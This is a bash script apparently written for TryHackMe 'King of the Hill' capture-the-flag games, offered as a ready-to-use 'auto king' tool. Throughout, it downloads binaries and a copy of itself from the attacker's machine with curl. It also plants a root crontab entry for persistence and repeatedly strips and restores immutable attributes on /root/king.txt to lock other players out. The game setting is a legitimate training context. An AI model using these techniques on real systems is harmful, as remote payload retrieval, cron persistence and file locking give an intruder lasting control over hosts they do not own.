#!/bin/bash
#
# /$$   /$$ /$$$$$$ /$$   /$$  /$$$$$$        /$$      /$$ /$$$$$$$$
#| $$  /$$/|_  $$_/| $$$ | $$ /$$__  $$      | $$$    /$$$| $$_____/
#| $$ /$$/   | $$  | $$$$| $$| $$  \__/      | $$$$  /$$$$| $$      
#| $$$$$/    | $$  | $$ $$ $$| $$ /$$$$      | $$ $$/$$ $$| $$$$$   
#| $$  $$    | $$  | $$  $$$$| $$|_  $$      | $$  $$$| $$| $$__/   
#| $$\  $$   | $$  | $$\  $$$| $$  \ $$      | $$\  $ | $$| $$      
#| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      | $$ \/  | $$| $$$$$$$$
#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v0.1                         
#
# Auto king script for THM KotH
# Written by Squ1rr3l (aka redsquirrel_7)
#
# DISCLAIMER: I'm pretty sure this isn't against the rules, but
# I am not responsible if you get banned for using this script!

HACKER_NAME=username	# Put your THM username here
HACKER_IP=127.0.0.1	# Put the IP of your attacker machine here

# Set us up a secret working directory
mkdir /var/kingme
cd /var/kingme

# Copy all the bins here and the kingme script as a backup
curl -o "kingme.sh" $HACKER_IP:8080/kingme.sh
chmod u+x /var/kingme/kingme.sh
curl -o "grep" $HACKER_IP:8080/busybox_GREP
chmod u+x /var/kingme/grep
curl -o "echo" $HACKER_IP:8080/busybox_ECHO
chmod u+x /var/kingme/echo
curl -o "chattr" $HACKER_IP:8080/busybox_CHATTR
chmod u+x /var/kingme/chattr
curl -o "chmod" $HACKER_IP:8080/busybox_CHMOD
chmod u+x /var/kingme/chmod
curl -o "cat" $HACKER_IP:8080/busybox_CAT
chmod u+x /var/kingme/cat

# Make sure our script runs again even if our shell gets borked
/var/kingme/echo "if /var/kingme/grep -q '$HACKER_NAME' /root/king.txt; then\n    exit\nelse\n    /var/kingme/kingme.sh\nfi" > /var/kingme/kingcron.sh
/var/kingme/chmod u+x /var/kingme/kingcron.sh
/var/kingme/echo "* * * * *  root  /var/kingme/kingcron.sh" >> /etc/crontab


# Forever take your rightful throne as king!!!
while true
do
	if /var/kingme/grep -q $HACKER_NAME /root/king.txt; then
		/var/kingme/echo $HACKER_NAME "is king! Nothing to do!"
	else
		LOSER=$(/var/kingme/cat /root/king.txt)
		/var/kingme/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
		/var/kingme/chattr -ai /root/king.txt
		/var/kingme/chmod u+w /root/king.txt
		/var/kingme/echo $HACKER_NAME > /root/king.txt
		/var/kingme/chattr +ai /root/king.txt
	fi
	sleep 1
done
